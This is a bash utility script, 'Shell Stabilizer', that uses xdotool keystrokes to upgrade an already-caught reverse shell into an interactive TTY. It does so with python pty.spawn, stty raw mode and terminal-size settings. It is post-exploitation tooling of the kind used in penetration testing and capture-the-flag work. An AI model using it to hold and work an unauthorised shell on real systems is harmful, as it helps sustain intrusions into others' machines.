#!/usr/bin/env bash
# Shell Stabilizer v.20220810
# Requires xdotool
# You're welcome. -EtcSec

# To Do List:
# Add ability to send different stabiliztion shells via cli arguments
# Find a better way to locate the target PTY, sleep is not unique enough

# xdotool has a hard time with certain characters; this fixes that
# by asking xdotool to type just one character at a time from the
# CMD variable by using the associated ASCII hex codes. 
function DoCommand () {
    CMD=$@
    for (( i=0; i<${#CMD}; i++ )); do
        CHAR=0x$(echo -n "${CMD:$i:1}" | xxd -p)
        xdotool key $CHAR
    done
    xdotool key Return; sleep $ZZZ
}

# Set the stabilizer to send; inner quotes must be escaped
STABILIZE="python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
SHELL="bash"

# Set the sleep time to compansate for connection lag
ZZZ=1

# Visual notification to double click on the shell that you want to stabilize
# BUG? - If using a split window like in Terminator; a DOUBLE CLICK is needed
echo -e "\n=-=-=-=-=-=-=-=_STABILIZER_=-=-=-=-=-=-=-="
echo "DOUBLE CLICK Reverse Shell To Stabilize..."

# The double click
# Click 1 -- Gets window ID
# Click 2 -- Sets window focus to target shell
WINID=$(xdotool selectwindow)
xdotool windowfocus --sync $WINID
echo "[+] Window $WINID selected."

# Send command to spawn a better shell
echo "[+] Spawning better shell..."
DoCommand $STABILIZE

# Background reverse connection & spawn sleep process to find PTY number
xdotool key ctrl+z; sleep $ZZZ
DoCommand "sleep 5 &"
LOCATION=$(ps -e | grep "sleep" | grep -oE "pts/[0-9]")
echo "[+] Found target terminal at /dev/$LOCATION."

# Extract terminal rows and columns from PTY found
SIZE=$(stty -F /dev/$LOCATION size)
ROWS=$(echo $SIZE | cut -d ' ' -f 1)
COLS=$(echo $SIZE | cut -d ' ' -f 2)
echo "[+] Found $ROWS rows and $COLS columns."

# Finish up the stabilization & set the terminal size
echo "[+] Sending final stage..."
DoCommand "stty raw -echo && fg"
DoCommand "reset"
DoCommand "export SHELL=$SHELL"
DoCommand "export TERM=xterm-256color"
DoCommand "stty rows $ROWS columns $COLS"
DoCommand "clear"

echo "[+] Done! Enjoy your shell!"
echo -e "=-=-=-=-=-=-=-=_STABILIZED_=-=-=-=-=-=-=-=\n"
